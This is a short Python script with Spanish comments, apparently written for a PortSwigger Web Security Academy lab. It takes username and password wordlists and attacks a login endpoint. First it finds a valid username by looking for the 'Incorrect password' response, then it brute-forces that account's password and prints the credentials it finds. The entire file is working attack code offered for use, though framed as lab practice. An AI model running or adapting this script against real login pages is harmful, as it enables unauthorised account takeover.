import requests

# Ingresar contenido de los documentos a la listas user y password

userfile = open('usuarios_noborrar.txt', 'r')

user = []

for x in userfile.readlines():
    user.append(x.strip())
userfile.close()

password = []

passwordfile = open('passwords_db.txt', 'r')
for x in passwordfile.readlines():
    password.append(x.strip())
passwordfile.close()

# Reemplzar el contenido de url con el del lab de PortSwigger
# Ex:
# url = 'https://0a07003803154c5b81bc2ae8004a0005.web-security-academy.net/login'

url = ''

# Definir el data payload como un raw string

valid_usernames = []

print("[+] Hackmetrix Python Script")
print("[+]")
print("[+] Testing all posible users from 'usuarios_noborrar.txt'")

for x in user:

    data = f"username={x}&password=password"

    # Definir el header, especifico el content type
    headers = {
       'Content-Type': 'application/x-www-form-urlencoded'
    }

    # Enviar un POST request con raw data
    response = requests.post(url, data=data, headers=headers)

    code = response.status_code

    text = response.text


    if code == 200:
        if "Incorrect password" in text:
            valid_usernames.append(x)
            print({x}," valid user found!")
            break
        else:
            print({x}," not valid user")


print("[+] Testing passwords for user:", valid_usernames)
print("")

for x in password:

    #Repetir mismos pasos

    data = f"username={valid_usernames[0]}&password={x}"

    headers = {
       'Content-Type': 'application/x-www-form-urlencoded'
    }

    response = requests.post(url, data=data, headers=headers)

    code = response.status_code

    text = response.text

    if code == 200:
        if "Incorrect password" in text:
            print({x}, " not valid password")
        else:
            password.append(x)
            print({x}, " password found!")
            print("")
            print("[+] Credentials found:")
            print({valid_usernames[0]}, ":", {x})
            break
